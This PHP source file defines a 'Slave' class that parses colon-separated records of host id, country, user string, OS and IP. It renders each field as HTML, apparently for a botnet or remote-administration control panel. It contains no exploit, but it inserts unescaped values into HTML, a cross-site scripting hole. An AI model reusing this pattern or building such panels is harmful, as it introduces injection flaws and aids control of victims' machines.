<?php
require_once "operatingsystem.php";

class Slave {

	public $array;

	public function makearray($s) {
		$data = explode(":", $s);
		$this->array = array(
				"id" => $data[0],
				"country" => $data[1],
				"userstring" => $data[2],
				"os" => $data[3],
				"ip" => $data[4],
		);
	}

	public function getUniqueId() {
		return $this->array['id'];
	}
	
	public function getDisplayCountry() {
		return $country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
	}
	
	public function getIdentifier() {
		return $userstring = '<b>' . $this->array['userstring'] . '</b>';
	}
	
	public function getIP() {
		return $this->array['ip'];
	}
	
	public function getOperatingSystem() {
		$os = $this->array['os'];
		$osIcon = '<img src="' . OperatingSystem::getIcon($os) . '"> ' . $os;
		return $osIcon;
	}
}